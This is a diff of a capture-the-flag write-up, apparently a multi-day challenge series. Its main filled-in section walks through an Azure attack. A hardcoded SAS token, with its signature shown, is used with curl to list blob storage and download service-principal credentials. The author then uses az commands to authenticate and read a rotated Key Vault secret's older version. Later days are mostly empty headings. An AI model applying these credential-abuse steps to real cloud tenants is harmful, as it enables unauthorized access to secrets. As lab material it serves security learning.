@@ -618,38 +618,130 @@ Key Finding: The client-side code contains hardcoded credentials or a Shared Acc
 
 <img width="1211" height="64" alt="vmware_TClvlz5aUs" src="https://github.com/user-attachments/assets/94fed7b3-ae77-4b6a-bf6d-63169486825c" />
 
-
-
-
    
 2. **Azure Storage Enumeration & Artifact Download:**
-   * List container files via Azure CLI:
-     ```bash
-     az storage blob list --container-name <CONTAINER_NAME> --account-name cryptocabanaf5scjagc --sas-token "<SAS_TOKEN>"
-     ```
+   With SAS key that has sp=rl rights im all to list all containers.
+   
+   
    * Download configuration backups containing Azure Service Principal credentials (`App ID`, `Password`, `Tenant ID`).
 
-3. **Service Principal Authentication:**
+4. **Service Principal Authentication:**
    * Log into Azure CLI using Service Principal details:
-     ```bash
-     az login --service-principal -u <CLIENT_ID> -p <CLIENT_SECRET> --tenant <TENANT_ID>
-     ```
+   * 
+  curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
 
-4. **Key Vault Secret Version Auditing:**
-   * List secrets in target vault:
-     ```bash
-     az keyvault secret list --vault-name <VAULT_NAME>
-     ```
-   * Inspect active secret value (noting recent rotation). Query historical secret versions:
-     ```bash
-     az keyvault secret list-versions --vault-name <VAULT_NAME> --name <SECRET_NAME>
-     ```
-   * Retrieve prior secret version value containing the challenge flag:
-     ```bash
-     az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME> --version <PREVIOUS_VERSION_ID> --query value -o tsv
-     ```
+and see $web, backup, and vault. Which is where i started to investigate next
+
+<img width="924" height="698" alt="vmware_8IEUySkT6P" src="https://github.com/user-attachments/assets/99a80f9e-d289-4545-886a-0d28c0b745d8" />
+
+and see $web, backup, and vault. Which is where i started to investigate next
+
+curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
+
+<img width="617" height="512" alt="vmware_omBGSmKyWu" src="https://github.com/user-attachments/assets/860ad6e8-a171-4f25-bcb6-13c33ad3b48e" />
+
+And I revelead two files backup-service-account.json and seed_phrase.txt (decoy).
+Continuing with investigation.
+
+curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
+
+<img width="722" height="146" alt="vmware_cSXafPfrQF" src="https://github.com/user-attachments/assets/a5972a58-9a1c-4212-be8b-86f7238854a1" />
+
+I find service principle keys and the exact place I need to look.
+
+### Service Principle Authenication
+
+I then authenicate as service principle and try grab the master keys. 
+
+<img width="508" height="347" alt="vmware_oOW5G4Fm2y" src="https://github.com/user-attachments/assets/b92ace0c-95b1-465b-b6e3-ee00cb87f978" />
+
+It gave me forbidden so i decided to see what I could read instead.
+
+az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table
+
+and I reveal three key shards and an expired master key so I try to see if I can read those.
+
+<img width="1074" height="349" alt="vmware_REORBczBeY" src="https://github.com/user-attachments/assets/d16ed8bd-7583-46b7-9214-f07f60ef82ba" />
+
+I was able to read key shar 1 and 3 but 2 was rotated after IT flagged it. 
+
+After some research I learned Azure Key Vault never overwrites secrets. Every update automatically generates a new version while preserving prior iterations. Anyone with get permissions for that secret can still access older, unpurged versions, meaning rotating a secret does not wipe its history. So decided to try and list it.
+
+az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 -o json
+
+and I found two but one is created 2 min later the the older one. (the one I want).
+
+az keyvault secret show \
+  --id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0" \
+  --query value -o tsv
+
+<img width="903" height="542" alt="vmware_TGo8X3v2Wy" src="https://github.com/user-attachments/assets/5f0e30bf-befa-4558-9051-9edd4bb3a8dc" />
+
+I was able to read it and reveal the last part of the flag.
+
 
 ---
+
+## Day 10 The Hollow Shell
+
+
+
+
+
+
+
+
+
+
+---
+
+## Day 11 Inifinity Pool
+
+
+
+
+
+
+
+
+
+---
+
+Day 12 After Hours
+
+
+### Step 1: File Inspection & Initial Strings Analysis
+
+1. Download and extract the challenge task files (`attachments-*.zip`).
+2. Inspect the extracted files: `INDEX.BTR`, `MAPPING1.MAP`, `MAPPING2.MAP`, `MAPPING3.MAP`, `OBJECTS.DATA`. These are structural components of a Windows **WMI Repository**.
+4. Search across all raw data files for standard PowerShell execution signatures:
+
+    ```bash strings * | grep -i "powershell" ```
+   
+
+
+
+
+---
+
+## Day 13 The Guestbook
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
+## Day 14: Management Wants A Word
 
 ## Defensive Remediation & Best Practices Summary
 
